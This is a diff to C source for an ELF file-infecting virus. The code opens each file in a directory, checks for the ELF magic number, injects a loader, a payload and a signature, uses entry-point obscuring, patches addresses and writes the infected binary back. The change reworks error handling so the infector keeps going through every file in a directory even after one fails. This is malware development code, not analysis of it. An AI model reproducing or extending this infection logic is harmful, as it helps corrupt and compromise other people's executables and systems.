@@ -142,7 +142,7 @@ static int		inject_sign(t_info *info)
 	return (0);
 }
 
-static int		infect_file(char *path)
+static void		infect_file(char *path)
 {
 	struct stat		st;
 	t_info			info;
@@ -150,34 +150,33 @@ static int		infect_file(char *path)
 	uint32_t		magic;
 	
 	if ((fd = ft_sysopen(path, O_RDWR)) ==  -1)
-		return (1);
+		return ;
 	init_info(&info);
 	ft_sysfstat(fd, &st);
 	info.file_size = st.st_size;
 	if ((info.file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
-		goto end_error;
+		goto end_close;
 	if ((magic = *((uint32_t *)(info.file))) != 0x464C457F)
-		goto end_error;
+		goto end_fct;
 	pe_parsing(&info);
 	if (reload_mapping(&info) == 1)
-		goto end_error;
+		goto end_fct;
 	if (find_text(&info) == 1)
-		goto end_error;
+		goto end_fct;
 	inject_loader(&info);
 	inject_payload(&info);
 	inject_end(&info);
 	epo_parsing(&info);
 	if (info.valid_target == 0)
-		goto end_error;
+		goto end_fct;
 	patch_addresses(&info);
 	inject_sign(&info);
 	ft_syswrite(fd, info.file, info.file_size);
+	end_fct:
 	ft_sysmunmap(info.file, info.file_size);
+	end_close:
 	ft_sysclose(fd);
-	return (0);
-	end_error:
-	ft_sysclose(fd);
-	return (1);
+	return ;
 }
 
 static int		infect_dir(char *path)
@@ -199,17 +198,13 @@ static int		infect_dir(char *path)
 			{
 				ft_memcpy(buf_path_file, path, PATH_MAX);
 				ft_strcat(buf_path_file, dir->d_name);
-				if ((infect_file(buf_path_file)) == 1)
-						goto end_error;
+				infect_file(buf_path_file);
 			}
 			pos += dir->d_reclen;
 		}
 	}
 	ft_sysclose(fd);
 	return (0);
-	end_error:
-	ft_sysclose(fd);
-	return (1);
 }
 
 int		main()
